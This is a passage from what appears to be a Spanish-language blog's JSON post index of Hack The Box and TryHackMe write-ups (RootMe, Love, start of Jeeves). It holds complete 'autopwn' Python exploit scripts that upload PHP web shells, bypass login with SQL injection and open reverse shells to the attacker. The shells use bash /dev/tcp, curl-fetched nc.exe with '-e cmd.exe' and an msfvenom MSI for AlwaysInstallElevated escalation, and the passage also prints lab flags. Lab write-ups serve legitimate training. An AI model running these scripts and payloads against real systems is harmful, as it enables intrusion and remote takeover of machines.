lo tanto, vamos a buscar en el sistema alguna forma de escalar privilegios, el primer paso es buscar algún privilegio especial SUID:www-data@rootme:/var/www$ find / -perm -4000 2&gt;/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/snapd/snap-confine/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic/usr/lib/eject/dmcrypt-get-device/usr/lib/openssh/ssh-keysign/usr/lib/policykit-1/polkit-agent-helper-1/usr/bin/traceroute6.iputils/usr/bin/newuidmap/usr/bin/newgidmap/usr/bin/chsh/usr/bin/python/usr/bin/at/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/bin/newgrp/usr/bin/passwd/usr/bin/pkexecEncontramos muchos, sin embargo, nos llama la atención python:www-data@rootme:/var/www$ ls -al /usr/bin/python-rwsr-sr-x 1 root root 3665768 Aug  4  2020 /usr/bin/pythonUtilizando python, tenemos una forma de escalar privilegios, vamos a iniciar python:www-data@rootme:/var/www$ pythonPython 2.7.17 (default, Jul 20 2020, 15:37:01) [GCC 7.5.0] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; Vamos a importar la librería os:www-data@rootme:/var/www$ pythonPython 2.7.17 (default, Jul 20 2020, 15:37:01) [GCC 7.5.0] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import osUtilizando esta librería podemos ejectuar comando en el sistema, por ejemplo:www-data@rootme:/var/www$ pythonPython 2.7.17 (default, Jul 20 2020, 15:37:01) [GCC 7.5.0] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(\"whoami\")www-data0Tenemos una forma de cambiar nuestro uid a 0, que corresponde a root:www-data@rootme:/var/www$ pythonPython 2.7.17 (default, Jul 20 2020, 15:37:01) [GCC 7.5.0] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(\"whoami\")www-data0&gt;&gt;&gt; os.setuid(0)&gt;&gt;&gt; os.system(\"whoami\")root0Observamos que somos root, ahora simplemente debemos darnos una bash:www-data@rootme:/var/www$ pythonPython 2.7.17 (default, Jul 20 2020, 15:37:01) [GCC 7.5.0] on linux2Type \"help\", \"copyright\", \"credits\" or \"license\" for more information.&gt;&gt;&gt; import os&gt;&gt;&gt; os.system(\"whoami\")www-data0&gt;&gt;&gt; os.setuid(0)&gt;&gt;&gt; os.system(\"whoami\")root0&gt;&gt;&gt; os.system(\"bash\")root@rootme:/var/www# whoamirootroot@rootme:/var/www# cat /root/root.txtTHM{******}¡Listo!, somos root.Antes de terminar, vamos a realizar un autopwn de la máquina, esto será desde la subida del archivo malicioso hasta convertise en root.Lo vamos a realizar de la siguiente manera, en primer lugar vamos a importar las librerías necesarias:import requestsfrom pwn import *from os import sysEn caso de no tener pwn, se debe instalar desde su página oficial.Luego, vamos a definir los argumentos que recibirá el script, en este caso será la ip de la máquina víctima:if len(sys.argv) &lt; 3:    print(f'[!] Uso: python3 {sys.argv[0]} \"Your_ip\" \"Target_IP\"\\n' )    sys.exit(1)El siguiente paso corresponde a definir las variables globales que utilizaremos, en este caso las url y una barra de progreso:url = f\"http://{sys.argv[2]}/panel/\"url_up = f\"http://{sys.argv[2]}/uploads/\"progress = log.progress(\"Autopwn\")s = requests.Session()Tenemos la primera función, que se encarga de subir el archivo php malicioso a la web:def file_upload():        payload = \"\"\"  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt; \"\"\"         data = {                'submit' : \"Upload\"            }        files  = {'fileUpload':(f'shell.phar',payload),                                    }        progress.status('Subiendo archivo php malicioso')        sleep(2)        r = s.post(url,files=files,data=data)Observamos que es la misma estructura que en el script de la explotación, sin embargo, ya no es una lista, pues como ya sabemos el tipo de extensión permitida, de la misma manera, pudo ser la extensión phtml.Luego, tenemos la función encarga de enviar la conexión reversa:def conection():    url_reverse = url_up + f\"shell.phar?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/{sys.argv[1]}/1234 0&gt;%261'\"    r = s.get(url_reverse)Esta corresponde a una versión alternativa para obtener la shell reversa, claramente es más sencillo que abrir el servidor en python y todo el tema, sin embargo, este método no siempre tiene resultados, hay veces que simplemente no funciona, por lo tanto, es mejor optar por las soluciones que normalmente funcionan en todos los sistemas, a pesar de ello, se utilizó en el código para variar y hacerlo más sencillo.Finalmente, tenemos el main:if __name__ == '__main__':    file_upload()    progress.status('Enviando conexión reversa...')    threading.Thread(target=conection, args=()).start()    shell = listen(1234,timeout=10).wait_for_connection()    shell.sendline(\"echo 'Ganando acceso como root...'\")    shell.sendline(\"cd /tmp\")    shell.sendline(\"echo 'import os ' &gt; testing.py\")    shell.sendline(\"echo 'os.setuid(0)' &gt;&gt; testing.py\")    shell.sendline(\"\"\"echo 'os.system(\"bash\")' &gt;&gt; testing.py\"\"\")    shell.sendline(\"python testing.py\")    shell.sendline(\"echo 'Listo, maquina rooteada, a continuacion las flags'\")    shell.sendline(\"cat /var/www/user.txt\")    shell.sendline(\"cat /root/root.txt\")    shell.interactive()Acá se hacen las llamadas a las funciones, utilizamos hilos para llamar a la función de conexión, esto es debido a que necesitamos tener el listener al mismo tiempo. Luego, cuando se establece la conexión, mediante la función sendline, se crea un archivo python igual en que la escalada de privilegios, se ejecuta y se gana acceso como root.Si lo ejecutamos:www-data@rootme:/tmp$ echo 'os.setuid(0)' &gt;&gt; testing.pywww-data@rootme:/tmp$ echo 'os.system(\"bash\")' &gt;&gt; testing.pywww-data@rootme:/tmp$ python testing.pyListo, maquina rooteada, a continuacion las flagsTHM{y0u_g0t_a_sh3ll}THM{pr1v1l3g3_3sc4l4t10n}$ whoamirootAcá está el código completo:import requestsfrom pwn import *from os import sysif len(sys.argv) &lt; 3:    print(f'[!] Uso: python3 {sys.argv[0]} \"Your_ip\" \"Target_IP\"\\n' )    sys.exit(1)url = f\"http://{sys.argv[2]}/panel/\" url_up = f\"http://{sys.argv[2]}/uploads/\"progress = log.progress(\"Autopwn\")s = requests.Session()def file_upload():        payload = \"\"\"  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt; \"\"\"         data = {                'submit' : \"Upload\"            }        files  = {'fileUpload':(f'shell.phar',payload),                                    }        progress.status('Subiendo archivo php malicioso')        sleep(2)        r = s.post(url,files=files,data=data)def conection():    url_reverse = url_up + f\"shell.phar?cmd=bash -c 'bash -i &gt;%26 /dev/tcp/{sys.argv[1]}/1234 0&gt;%261'\"    r = s.get(url_reverse)if __name__ == '__main__':    file_upload()    progress.status('Enviando conexión reversa...')    threading.Thread(target=conection, args=()).start()    shell = listen(1234,timeout=10).wait_for_connection()    shell.sendline(\"echo 'Ganando acceso como root...'\")    shell.sendline(\"cd /tmp\")    shell.sendline(\"echo 'import os ' &gt; testing.py\")    shell.sendline(\"echo 'os.setuid(0)' &gt;&gt; testing.py\")    shell.sendline(\"\"\"echo 'os.system(\"bash\")' &gt;&gt; testing.py\"\"\")    shell.sendline(\"python testing.py\")    shell.sendline(\"echo 'Listo, maquina rooteada, a continuacion las flags'\")    shell.sendline(\"cat /var/www/user.txt\")    shell.sendline(\"cat /root/root.txt\")    shell.interactive()Hemos terminado la automatización de la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Love HTB Write-up",
    "url": "/posts/Love/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Web, SSRF, CMS, Autopwn, ALwaysInstallELevated, WinPEAS, Windows, Easy",
    "date": "2023-02-10 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Love, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del s...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Love, la cual tiene una dificultad easy. Para lograr vulnerarla realizaremos lo siguiente:  Enumeración del sistema y descubrimiento de directorios y subdominios.  SSRF para encontrar información.  Abuso del CMS voting system (vulnerable).  Abuso del AlwaysInstallElevated utilizando archivo .msi.  Automatización de la intrusión mediante python.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.10.239PING 10.10.10.239 (10.10.10.239) 56(84) bytes of data.64 bytes from 10.10.10.239: icmp_seq=1 ttl=127 time=145 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap -p- -sS --open -min-rate 5000 10.10.10.239 -oG PortAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT      STATE SERVICE80/tcp    open  http135/tcp   open  msrpc139/tcp   open  netbios-ssn443/tcp   open  https445/tcp   open  microsoft-ds3306/tcp  open  mysql5000/tcp  open  upnp5040/tcp  open  unknown5985/tcp  open  wsman5986/tcp  open  wsmans7680/tcp  open  pando-pub47001/tcp open  winrm49664/tcp open  unknown49665/tcp open  unknown49666/tcp open  unknown49667/tcp open  unknown49668/tcp open  unknown49669/tcp open  unknown49670/tcp open  unknownRealizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 10.10.10.239Como resultado del escaneo tenemos:PORT      STATE SERVICE      VERSION80/tcp    open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)|_http-title: Voting System using PHP| http-cookie-flags: |   /: |     PHPSESSID: |_      httponly flag not set|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27135/tcp   open  msrpc        Microsoft Windows RPC139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn443/tcp   open  ssl/http     Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_ssl-date: TLS randomness does not represent time| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after:  2022-01-18T14:00:16| tls-alpn: |_  http/1.1|_http-title: 403 Forbidden445/tcp   open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)3306/tcp  open  mysql?| fingerprint-strings: |   NotesRPC: |_    Host '10.10.14.17' is not allowed to connect to this MariaDB server5000/tcp  open  http         Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden5040/tcp  open  unknown5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.05986/tcp  open  ssl/http     Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0| ssl-cert: Subject: commonName=LOVE| Subject Alternative Name: DNS:LOVE, DNS:Love| Not valid before: 2021-04-11T14:39:19|_Not valid after:  2024-04-10T14:39:19| tls-alpn: |_  http/1.1|_ssl-date: 2023-02-11T21:36:15+00:00; +21m32s from scanner time.|_http-title: Not Found7680/tcp  open  pando-pub?47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-title: Not Found|_http-server-header: Microsoft-HTTPAPI/2.049664/tcp open  msrpc        Microsoft Windows RPC49665/tcp open  msrpc        Microsoft Windows RPC49666/tcp open  msrpc        Microsoft Windows RPC49667/tcp open  msrpc        Microsoft Windows RPC49668/tcp open  msrpc        Microsoft Windows RPC49669/tcp open  msrpc        Microsoft Windows RPC49670/tcp open  msrpc        Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.93%I=7%D=2/11%Time=63E804A5%P=x86_64-pc-linux-gnu%r(NoSF:tesRPC,4A,\"F\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.17'\\x20is\\x20not\\x20aSF:llowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:| smb-os-discovery: |   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)|   OS CPE: cpe:/o:microsoft:windows_10::-|   Computer name: Love|   NetBIOS computer name: LOVE\\x00|   Workgroup: WORKGROUP\\x00|_  System time: 2023-02-11T13:36:02-08:00| smb2-security-mode: |   311: |_    Message signing enabled but not required|_clock-skew: mean: 2h21m32s, deviation: 4h00m01s, median: 21m31s| smb2-time: |   date: 2023-02-11T21:36:00|_  start_date: N/A| smb-security-mode: |   account_used: &lt;blank&gt;|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)En primer lugar, se observa el puerto 445 abierto, el cual corresponde al servicio smb, por lo tanto, intentaremos realizar una enumeración del equipo y también si es posible de usuarios o recursos, para ello usaremos diferentes herramientas, la primera es crackmapexec: crackmapexec smb 10.10.10.239SMB         10.10.10.239    445    LOVE             [*] Windows 10 Pro 19042 x64 (name:LOVE) (domain:Love) (signing:False) (SMBv1:True)Intentamos listar recursos compartidos mediante smbmap:smbmap -H 10.10.10.239[!] Authentication error on 10.10.10.239Pero necesitamos credenciales para poder listar contenido.Obsevamos el puerto 80 abierto, por lo tanto, utilizando whatweb vamos a enumerar información del sistema:whatweb 10.10.10.239http://10.10.10.239 [200 OK] Apache[2.4.46], Bootstrap, Cookies[PHPSESSID], Country[RESERVED][ZZ], HTML5, HTTPServer[Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27], IP[10.10.10.239], JQuery, OpenSSL[1.1.1j], PHP[7.3.27], PasswordField[password], Script, Title[Voting System using PHP], X-Powered-By[PHP/7.3.27], X-UA-Compatible[IE=edge]Al entrar a la web vemos lo siguiente:Vemos un panel donde se pide id y password, antes de intentar realizar algún tipo de injección terminaremos de enumerar el sistema, ahora realizamos fuzzing utilizando wfuzz:wfuzz -c --hc=404,403 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 200 http://10.10.10.239/FUZZEncontramos algo interesante:000000259:   301        9 L      30 W       337 Ch      \"admin\"Vamos a la página a ver qué encontramos:Ahora es un panel de autenticación, con el mismo título de voting system, desconocemos si se trata de algún tipo de CMS, por lo tanto, buscamos por la web si existe y sí, corresponde a un CMS, por lo tanto, buscaremos vulnerabilidades asociadas:searchsploit voting systemVoting System 1.0 - Authentication Bypass (SQLI)                                                                                                                                 | php/webapps/49843.txtVoting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                                                                        | php/webapps/49445.pyVoting System 1.0 - Remote Code Execution (Unauthenticated)                                                                                                                      | php/webapps/49846.txtVoting System 1.0 - Time based SQLI  (Unauthenticated SQL injection)                                                                                                             | php/webapps/49817.txtObsevamos que hay diversas vulnerabilidades para este CMS. Sin embargo, seguiremos enumerando el sistema por ahora.Observamos que está el puerto 5000 abierto, por lo tanto, vamos a ingresar:Sin embargo, no tenemos permisos para ver este recurso.Vamos a seguir buscando información. En este caso intentaremos encontrar si es que existe algún subdominio, vemos que está el puerto 443 abierto, por lo tanto, nos conectamos con openssl por si encontramos información:openssl s_client  -connect 10.10.10.239:443Dentro de toda la información encontramos algo interesante: 0 s:C = in, ST = m, L = norway, O = ValentineCorp, OU = love.htb, CN = staging.love.htb, emailAddress = roy@love.htbVamos a agregar love.htb y staging.love.htb al /etc/hosts:127.0.0.1       localhost127.0.1.1       kali::1             localhost ip6-localhost ip6-loopbackff02::1         ip6-allnodesff02::2         ip6-allrouters10.10.10.239    love.htb staging.love.htbSi ingresamos a staging.love.htb tenemos:Encontramos una sección llamada Demo, entramos en ella:Observamos que necesita una url, por lo tanto, abriremos un servidor http con python y pondremos nuestra dirección en la sección demo para probar si la página es funcional:python3 -m http.server 80Ingresamos nuestra ip:Si miramos nuestro servidor en python tenemos:Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...10.10.10.239 - - [11/Feb/2023 21:47:32] \"GET / HTTP/1.1\" 200 -ExplotaciónVemos que efectivamente es funcional. Como por detrás está haciendo la consulta a una URL lo que podríamos hacer es verificar si se puede realizar un SSRF, en este caso probaremos si podemos enumerar información del lado del servidor que no podemos, para esto en vez de utilizar nuestra ip utilizaremos el localhost, especificamente en el puerto 5000, pues teniamos una página en la cual no teniamos permisos para revisar:Observamos que si se ha logrado obtener la información de la página desde el localhost. Observamos unas credenciales, en este caso de administrador, iremos a la página de administrador para intentar entrar:Estamos dentro del CMS como administradores. Si volvemos a mirar los resultados de searchsploit encontramos esto:Voting System 1.0 - File Upload RCE (Authenticated Remote Code Execution)                                                                                                        | php/webapps/49445.pyTendríamos un RCE si estamos autenticados, y es el caso por lo tanto, vamos a ver que hace el código:# --- Edit your settings here ----IP = \"192.168.1.207\" # Website's URLUSERNAME = \"potter\" #Auth usernamePASSWORD = \"password\" # Auth PasswordREV_IP = \"192.168.1.207\" # Reverse shell IPREV_PORT = \"8888\" # Reverse port# --------------------------------Vemos un área donde debemos ingresador los datos para ganar acceso al sistema. Si cambiamos los valores y ejecutamos el código no da un error. Si inspeccionamos el código nos damos cuenta que se realizan varias peticiones con estas url:INDEX_PAGE = f\"http://{IP}/votesystem/admin/index.php\"LOGIN_URL = f\"http://{IP}/votesystem/admin/login.php\"VOTE_URL = f\"http://{IP}/votesystem/admin/voters_add.php\"CALL_SHELL = f\"http://{IP}/votesystem/images/shell.php\"sin embargo, si observamos nuestro index:http://10.10.10.239/admin/home.phpNo existe la ruta votesystem, por lo tanto, lo cambiaremos en el script, si lo ejecutamos de nuevo: python3 49445.pyStart a NC listner on the port you choose above and run...Logged inPoc sent successfullySi vamos a nuestro netcat:nc -nvlp 8888listening on [any] 8888 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.10.239] 50710b374k shell : connectedMicrosoft Windows [Version 10.0.19042.867](c) 2020 Microsoft Corporation. All rights reserved.C:\\xampp\\htdocs\\omrs\\images&gt;whoamiwhoamilove\\phoebHemos conseguido acceso al sistema (La explicación de por qué funciona este exploit será más adelante cuando programemos el autopwn).Buscamos la flag de usuario:C:\\Users\\Phoebe\\Desktop&gt;type user.txttype user.txt3f115dbec9b51e23c3608a87dBien, tenemos la flag, ahora debemos escalar privilegios.Escalada de privilegiosPara encontrar vías potenciales de escalada utilizaremos winPEAS.exe, mediante un servidor http con python compartimos el recurso y dentro de la máquina víctima ponemos:certutil.exe -f -urlcache -split http://10.10.14.17/winPEASx64.exe winPEAS.exeAl tenerlo en el equipo lo ejecutamos y buscamos cosas interesantes:Checking AlwaysInstallElevated https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#alwaysinstallelevated    AlwaysInstallElevated set to 1 in HKLM!    AlwaysInstallElevated set to 1 in HKCU!Observamos una posible forma de escalar privilegios, iremos a web de hacktricks para ver en que consiste.Básicamente, debemos realizar un payload .msi que haga una reverse shell con msfvenom y luego ejectuarlo con msiexec /quiet /qn /i.Por lo tanto, creamos el payload:msfvenom -p windows/x64/shell_reverse_tcp  LHOST=10.10.14.17 LPORT=1235 --platform windows -a x64 -f msi -o reverse.msiLuego, este archivo creado lo pasaremos a la máquina víctima:curl 10.10.14.17/reverse.msi -o reverse.msi  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current                                 Dload  Upload   Total   Spent    Left  Speed100  156k  100  156k    0     0   156k      0  0:00:01 --:--:--  0:00:01  191kCon este archivo dentro de la máquina windows lo ejecutamos con msiexec /quiet /qn /i mientras tenemos netcat escuchando:C:\\xampp\\htdocs\\omrs\\images&gt;msiexec /quiet /qn /i reverse.msimsiexec /quiet /qn /i reverse.msiSi observamos nuestro netcat:rlwrap nc -nvlp 1235listening on [any] 1235 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.10.239] 59296Microsoft Windows [Version 10.0.19042.867](c) 2020 Microsoft Corporation. All rights reserved.C:\\WINDOWS\\system32&gt;whoamiwhoamint authority\\systemBien, estamos dentro, ahora buscaremos la flag:C:\\Users\\Administrator\\Desktop&gt;type root.txttype root.txt799e26baf2559167d6b1257¡Bien!Hemos ganado acceso como administrador.Sin embargo, ahora haremos un autopwn en python que nos permitirá ganar acceso al sistema.El código consiste en estos pasos:  injección sql para logearse en voting system.  Subir un archivo php malicioso que permite utilizar la variable cmd para injectar comandos.  Utilizar este archivo php para subir el netcat.exe a la máquina víctima.  Utilizar el mismo archivo php para realizar una conexión hacia nuestro equipo.En primer lugar, tenemos las librerías:import requests,sys,subprocessfrom pwn import *from os import systemLuego, tenemos la función encargada del control + c y la función que aparece si no ingresan correctamente los datos:def def_handler(sig, frame):    print(\"\\n\\n[!] saliendo...\\n\")    sys.exit(1)signal.signal(signal.SIGINT, def_handler)if len(sys.argv) &lt; 3:    print(f'[!] Uso: python3 {sys.argv[0]} \"Tu IP\" \"Puerto para tu netcat\"\\n' )    sys.exit(1)Definimos las variables globales:ipHost = sys.argv[1]ipPort = sys.argv[2]LoveIP = 'http://10.10.10.239's = requests.Session()Tenemos la siguiente función que se encarga de obtener el path del nc.exe y copiarlo en el directorio actual de trabajo:def getNetcat():    try:        result = subprocess.check_output([\"locate\", \"nc.exe\"])        result2 = result.decode(\"utf-8\")        path = result2.split(\"\\n\")[0]        system(f'cp {path} .')    except:        print(\"nc.exe not found\")        exit(1)La siguiente función corresponde a la injección sql obtenida a través de searchsploit, la cual nos permite logearnos como administrador en el voting system:def sqli():    ip = f'{LoveIP}/admin/login.php'    post_data = {        'login':'yea',        'password':'admin',        'username': \"\"\"dsfgdf' UNION SELECT 1,2,\"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K\",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -\"\"\"    }    cookies = s.cookies    r = s.post(ip,data = post_data,cookies=cookies)    if r.status_code == 200:        print(\"[+] Injección SQL exitosa\\n\")    else:        print(\"[!] Injección SQL fallida\\n\")        sys.exit(1)Con la sesión iniciada, procedemos a subir un archivo php malicioso:def uploadshell():    payload = \"\"\"  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt; \"\"\"     files  = {'photo':('shell.php',payload)        }    post_data = {            'firstname' :' lorem',            'lastname':'lorem',            'password':'lorem',            'add':''        }    LoveVote= f'{LoveIP}/admin/voters_add.php'    r = s.post(LoveVote, data= post_data,files=files)    if r.status_code == 200:            print(\"[+] Subida de shell existosa\\n\")    else:            print(\"[!] Subida de shell fallida\\n\")            exit(1)Con el archivo ya subido a la máquina, intentaremos subir el nc.exe a la máquina víctima:def uploadNC():    ip = f'{LoveIP}/images/shell.php?cmd=curl {ipHost}/nc.exe -O nc.exe'    r = s.get(ip)Finalmente, nos conectamos con el nc.exe desde la máquina víctima:def conection():    print('\\t\\n\\n[+] Completando proceso, revise netcat\\n')    ip = f'{LoveIP}/images/shell.php?cmd=nc.exe -e cmd.exe {ipHost} {ipPort}'    r = s.get(ip)Dentro del main tenemos:if __name__ == '__main__':    print(f'\\n[+] Recuerda estar esperando conexión en netcat en el puerto {sys.argv[2]}\\n\\n')    sleep(2)    getNetcat()    sqli()    uploadshell()    try:        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:            so.bind(('localhost', 80))            http_server = subprocess.Popen([\"python3\", \"-m\", \"http.server\", \"80\"])    except OSError:            print(\"\\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor\")       uploadNC()    http_server.terminate()    conection()Obsevamos la llamada de las funciones y el subproceso que permite tener un servidor http con python para compartir el nc.exe y que la máquina víctima pueda descargarlo.Luego, solo basta con iniciar al script junto con tu ip y el puerto que quieras recibir la reverse, y dejas tu netcat esperando conexión.[+] Completando proceso, revise netcatnc -nvlp 1234listening on [any] 1234 ...connect to [10.10.14.17] from (UNKNOWN) [10.10.10.239] 60385Microsoft Windows [Version 10.0.19042.867](c) 2020 Microsoft Corporation. All rights reserved.C:\\xampp\\htdocs\\omrs\\images&gt;El código completo es el siguiente:import requests,sys,subprocessfrom pwn import *from os import systemdef def_handler(sig, frame):    print(\"\\n\\n[!] saliendo...\\n\")    sys.exit(1)signal.signal(signal.SIGINT, def_handler)if len(sys.argv) &lt; 3:    print(f'[!] Uso: python3 {sys.argv[0]} \"Tu IP\"  \"Puerto para tu netcat\"\\n' )    sys.exit(1)ipHost = sys.argv[1]ipPort = sys.argv[2]LoveIP = 'http://10.10.10.239's = requests.Session()def getNetcat():    try:        result = subprocess.check_output([\"locate\", \"nc.exe\"])        result2 = result.decode(\"utf-8\")        path = result2.split(\"\\n\")[0]        system(f'cp {path} .')    except:        print(\"nc.exe not found\")        exit(1)def sqli():    ip = f'{LoveIP}/admin/login.php'    post_data = {        'login':'yea',        'password':'admin',        'username': \"\"\"dsfgdf' UNION SELECT 1,2,\"$2y$12$jRwyQyXnktvFrlryHNEhXOeKQYX7/5VK2ZdfB9f/GcJLuPahJWZ9K\",4,5,6,7 from INFORMATION_SCHEMA.SCHEMATA;-- -\"\"\"    }    cookies = s.cookies    r = s.post(ip,data = post_data,cookies=cookies)    if r.status_code == 200:        print(\"[+] Injección SQL exitosa\\n\")    else:        print(\"[!] Injección SQL fallida\\n\")        sys.exit(1)def uploadshell():    payload = \"\"\"  &lt;?php echo \"&lt;pre&gt;\" . shell_exec($_REQUEST['cmd']) . \"&lt;/pre&gt;\"; ?&gt; \"\"\"     files  = {'photo':('shell.php',payload)        }    post_data = {            'firstname' :' lorem',            'lastname':'lorem',            'password':'lorem',            'add':''        }    LoveVote= f'{LoveIP}/admin/voters_add.php'    r = s.post(LoveVote, data= post_data,files=files)    if r.status_code == 200:            print(\"[+] Subida de shell existosa\\n\")    else:            print(\"[!] Subida de shell fallida\\n\")            exit(1)def uploadNC():    ip = f'{LoveIP}/images/shell.php?cmd=curl {ipHost}/nc.exe -O nc.exe'    r = s.get(ip)def conection():    print('\\t\\n\\n[+] Completando proceso, revise netcat\\n')    ip = f'{LoveIP}/images/shell.php?cmd=nc.exe -e cmd.exe {ipHost} {ipPort}'    r = s.get(ip)if __name__ == '__main__':    print(f'\\n[+] Recuerda estar esperando conexión en netcat en el puerto {sys.argv[2]}\\n\\n')    sleep(2)    getNetcat()    sqli()    uploadshell()    try:        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as so:            so.bind(('localhost', 80))            http_server = subprocess.Popen([\"python3\", \"-m\", \"http.server\", \"80\"])    except OSError:            print(\"\\n[-] El puerto 80 se encuentra en uso, no se ha podido ejectuar el servidor\")       uploadNC()    http_server.terminate()    conection()¡Listo! terminamos la automatización de la intrusión.Nos vemos, hasta la próxima."
  },
  
  {
    "title": "Jeeves HTB Write-up",
    "url": "/posts/Jeeves/",
    "categories": "Write up, Hack The Box",
    "tags": "Enumeration, Fuzzing, Web, Kdbx, Jenkins, Pass the hash, Windows, Medium",
    "date": "2023-02-10 00:00:00 -0500",
    





    
    "snippet": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Jeeves, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Fuzzing a un I...",
    "content": "ResumenSaludos, en esta oportunidad vamos a resolver la máquina de Hack The Box llamada Jeeves, la cual tiene una dificultad media. Para lograr vulnerarla realizaremos lo siguiente:  Fuzzing a un IIS.  Utilización de la consola de jenkins para ganar acceso al sistema.  Obtención credenciales a través de archivo .kdbx.  Pass the hash.Reconocimiento y EnumeraciónEn primer lugar, se comprueba la correcta conexión en la VPN con la máquina utilizando ping:ping -c 1 10.10.10.63PING 10.10.10.63 (10.10.10.63) 56(84) bytes of data.64 bytes from 10.10.10.63: icmp_seq=1 ttl=127 time=138 msSe observa que existe una correcta conexión con la máquina.Para realizar un reconocimiento activo se utilizará la herramienta nmap, en búsqueda de puertos abiertos en todo el rango (65535) y aplicando el parámetro -sS el cual permite aumentar el rendimiento del escaneo, haciendo que las conexiones no se realicen totalmente (haciendo solo syn  syn-ack):sudo nmap --open -sS -p- -min-rate 5000 -n -Pn 10.10.11.108 -oG portsAl finalizar el escaneo, se pueden observar los puertos abiertos de la máquina víctima:PORT      STATE SERVICE80/tcp    open  http135/tcp   open  msrpc445/tcp   open  microsoft-ds50000/tcp open  ibm-db2Realizamos un escaneo de los servicios expuestos utilizando nmap:sudo nmap -sCV -p80,135,445,50000 10.10.10.63 -oN ServiceScanComo resultado del escaneo tenemos:PORT      STATE SERVICE      VERSION80/tcp    open  http         Microsoft IIS httpd 10.0|_http-server-header: Microsoft-IIS/10.0|_http-title: Ask Jeeves| http-methods: |_  Potentially risky methods: TRACE135/tcp   open  msrpc        Microsoft Windows RPC445/tcp   open  microsoft-ds Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)50000/tcp open  http         Jetty 9.4.z-SNAPSHOT|_http-server-header: Jetty(9.4.z-SNAPSHOT)|_http-title: Error 404 Not FoundService Info: Host: JEEVES; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 4h59m58s, deviation: 0s, median: 4h59m58s| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: disabled (dangerous, but default)| smb2-security-mode: |   311: |_    Message signing enabled 